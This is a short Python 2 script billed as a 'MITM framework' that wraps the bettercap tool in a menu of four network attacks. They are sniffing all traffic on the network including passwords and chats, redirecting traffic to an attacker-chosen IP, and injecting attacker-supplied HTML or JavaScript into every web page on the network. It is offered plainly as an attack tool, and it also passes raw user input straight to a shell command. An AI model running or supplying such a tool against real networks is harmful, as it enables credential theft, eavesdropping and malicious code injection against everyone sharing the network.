import os
import time
#MITM framework by err420
os.system('clear') 
print "          $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
print "          $ 	    MITM framework         $"
print "          $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
print ""
print " 1)Simple sniff  2)DNS Spoofing  3)HTML inject  4)JS inject"
print ""
print "Type 'help' for more informations"
inst=raw_input(">")
if inst == '1':
	print ""
	print "Ctrl + c to stop"	
	os.system('bettercap -X')

if inst == '2':
	print ""	
	spoof=raw_input("Enter the IP address where you want to redirect the traffic: " )
	os.system('bettercap  --proxy-module redirect --redirect-url ' + spoof)	

if inst == '3':
	print ""
	html=raw_input("Specify the file containing html code you would like to inject. (/.../x.html): ")
	os.system('bettercap --proxy-module injecthtml --html-file ' +html)


if inst == '4':
	print ""
	js=raw_input("Specify the file containing js code you would like to inject. (/.../x.js: ")
	os.system('bettercap --proxy-module injectjs --js-file ' +js)

if inst == 'help' :
	print "1) Show all the internet traffic including password, chats..."
	print ""
	print "2) Redirect all the internet traffic to a specified IP"
	print ""
	print "3) Inject HTML code in all the html pages on your network"
	print ""
	print "4) Inject JS code in all the html pages on your network"

